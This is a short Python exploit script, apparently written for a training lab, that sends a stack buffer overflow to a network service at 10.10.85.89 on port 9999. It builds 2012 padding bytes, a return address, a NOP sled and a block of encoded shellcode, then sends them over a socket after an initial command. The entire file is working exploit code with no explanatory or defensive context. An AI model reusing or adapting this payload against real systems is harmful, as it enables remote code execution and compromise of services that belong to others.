# Overflow at 2800
#!/usr/bin/python3
import socket, sys, struct

IP = "10.10.85.89"
PORT = 9999

offset = 2012
overflow = b"\x41" * offset
retn = b"\xDF\x14\x50\x62"
padding = b"\x90" * 16
payload = (
  b"\xbd\x0b\x10\x8e\xeb\xdb\xd2\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
  b"\x52\x83\xc2\x04\x31\x6a\x0e\x03\x61\x1e\x6c\x1e\x89\xf6\xf2"
  b"\xe1\x71\x07\x93\x68\x94\x36\x93\x0f\xdd\x69\x23\x5b\xb3\x85"
  b"\xc8\x09\x27\x1d\xbc\x85\x48\x96\x0b\xf0\x67\x27\x27\xc0\xe6"
  b"\xab\x3a\x15\xc8\x92\xf4\x68\x09\xd2\xe9\x81\x5b\x8b\x66\x37"
  b"\x4b\xb8\x33\x84\xe0\xf2\xd2\x8c\x15\x42\xd4\xbd\x88\xd8\x8f"
  b"\x1d\x2b\x0c\xa4\x17\x33\x51\x81\xee\xc8\xa1\x7d\xf1\x18\xf8"
  b"\x7e\x5e\x65\x34\x8d\x9e\xa2\xf3\x6e\xd5\xda\x07\x12\xee\x19"
  b"\x75\xc8\x7b\xb9\xdd\x9b\xdc\x65\xdf\x48\xba\xee\xd3\x25\xc8"
  b"\xa8\xf7\xb8\x1d\xc3\x0c\x30\xa0\x03\x85\x02\x87\x87\xcd\xd1"
  b"\xa6\x9e\xab\xb4\xd7\xc0\x13\x68\x72\x8b\xbe\x7d\x0f\xd6\xd6"
  b"\xb2\x22\xe8\x26\xdd\x35\x9b\x14\x42\xee\x33\x15\x0b\x28\xc4"
  b"\x5a\x26\x8c\x5a\xa5\xc9\xed\x73\x62\x9d\xbd\xeb\x43\x9e\x55"
  b"\xeb\x6c\x4b\xf9\xbb\xc2\x24\xba\x6b\xa3\x94\x52\x61\x2c\xca"
  b"\x43\x8a\xe6\x63\xe9\x71\x61\x86\xe8\x5f\xd7\xfe\xf6\x9f\x06"
  b"\xa3\x7f\x79\x42\x4b\xd6\xd2\xfb\xf2\x73\xa8\x9a\xfb\xa9\xd5"
  b"\x9d\x70\x5e\x2a\x53\x71\x2b\x38\x04\x71\x66\x62\x83\x8e\x5c"
  b"\x0a\x4f\x1c\x3b\xca\x06\x3d\x94\x9d\x4f\xf3\xed\x4b\x62\xaa"
  b"\x47\x69\x7f\x2a\xaf\x29\xa4\x8f\x2e\xb0\x29\xab\x14\xa2\xf7"
  b"\x34\x11\x96\xa7\x62\xcf\x40\x0e\xdd\xa1\x3a\xd8\xb2\x6b\xaa"
  b"\x9d\xf8\xab\xac\xa1\xd4\x5d\x50\x13\x81\x1b\x6f\x9c\x45\xac"
  b"\x08\xc0\xf5\x53\xc3\x40\x15\xb6\xc1\xbc\xbe\x6f\x80\x7c\xa3"
  b"\x8f\x7f\x42\xda\x13\x75\x3b\x19\x0b\xfc\x3e\x65\x8b\xed\x32"
  b"\xf6\x7e\x11\xe0\xf7\xaa"
)
postfix = b""

buffer = overflow + retn + padding + payload + postfix

print(len(buffer))

def printRecv(s: socket):
    data = s.recv(1024)
    print(data.decode('utf-8'))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(5)
    s.connect((IP, PORT))
    printRecv(s)
    try:
      s.send("unclear".encode('utf-8'))
      printRecv(s)
      input("Type to continue")
      s.send(buffer)
      print("Buffer Send")
      s.close()
    except:
      print("Server Crashed")
      sys.exit(0)